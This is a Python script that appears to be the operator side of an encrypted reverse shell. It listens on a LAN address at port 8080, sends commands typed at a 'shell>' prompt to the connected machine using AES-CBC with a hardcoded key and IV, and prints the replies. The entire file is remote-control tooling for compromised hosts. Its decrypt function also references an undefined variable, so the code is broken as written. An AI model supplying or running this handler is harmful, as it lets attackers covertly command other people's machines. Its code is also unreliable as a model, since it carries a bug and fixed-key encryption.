import socket
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

key = b"H" * 32
IV = b"H" * 16

def encrypt(message):
    encryptor = AES.new(key,AES.MODE_CBC,IV)
    paddedmessage = Padding.pad(message,16)
    encrypted_message = encryptor.encrypt(paddedmessage)
    return encrypted_message

def decrypt(message):
    decryptor = AES.new(key,AES.MODE_CBC,IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,16)
    return decrypted_message

def connect():
    s = socket.socket()
    s.bind(("192.168.42.153",8080))
    s.listen(1)
    conn,addr = s.accept()
    while True:
        command = input("shell> ")
        if 'terminate' in command:
            conn.send(encrypt(b'terminate'))
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            print(decrypt(conn.recv(1024)).decode())

def main():
    connect()
main()
